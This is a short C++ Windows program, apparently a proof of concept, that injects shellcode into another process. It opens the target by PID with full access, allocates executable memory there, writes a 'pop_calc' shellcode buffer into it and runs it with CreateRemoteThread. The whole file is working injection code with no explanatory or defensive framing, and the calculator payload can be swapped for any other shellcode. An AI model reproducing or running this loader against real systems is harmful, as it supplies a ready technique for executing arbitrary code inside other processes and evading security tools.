#include <windows.h>

#include "ulib.h"

int main(int argc, char** argv)
{
  HANDLE processHandle;
  HANDLE remoteThread;
  PVOID remoteBuffer;

  printf("Injecting to PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  remoteBuffer =
      VirtualAllocEx(processHandle, NULL, sizeof(ul::shellcodes::x86::pop_calc),
                     (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(processHandle, remoteBuffer, ul::shellcodes::x86::pop_calc,
                     sizeof(ul::shellcodes::x86::pop_calc), NULL);
  remoteThread =
      CreateRemoteThread(processHandle, NULL, 0,
                         (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
}